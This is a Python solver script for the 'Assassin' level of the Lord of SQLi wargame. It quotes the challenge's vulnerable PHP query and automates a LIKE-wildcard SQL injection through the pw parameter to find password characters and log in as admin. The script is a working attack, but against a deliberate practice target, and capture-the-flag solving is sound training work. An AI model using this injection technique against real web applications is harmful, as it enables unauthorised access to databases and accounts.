#!/usr/bin/env python3
import los
import los_cookies as lc


def main():
    """
    Assassin

    if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~");
    $query = "select id from prob_assassin where pw like '{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>";
    if($result['id'] == 'admin') solve("assassin");
    """

    url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'

    allchars = 'abcdefghijklmnopqrstuvwxyz1234567890'
    find_char = []
    p = los.SqlInjection(url, cook, method, inj_param, '')

    for char in allchars:
        p.payload = f'%{char}%'
        response = p.my_request()
        print('')
        if 'Hello guest' in response:
            find_char.append(char)
        if len(find_char) == 2:
            break

    p.payload = f'%{find_char[0]}%{find_char[1]}%'
    response = p.my_request()

    if 'Clear!' in response:
        print('\nAssassin Clear!')
    else:
        print('')
        p.payload = f'%{find_char[1]}%{find_char[0]}%'
        response = p.my_request()
        if 'Clear!' in response:
            print('\nAssassin Clear!')


if __name__ == '__main__':
    main()
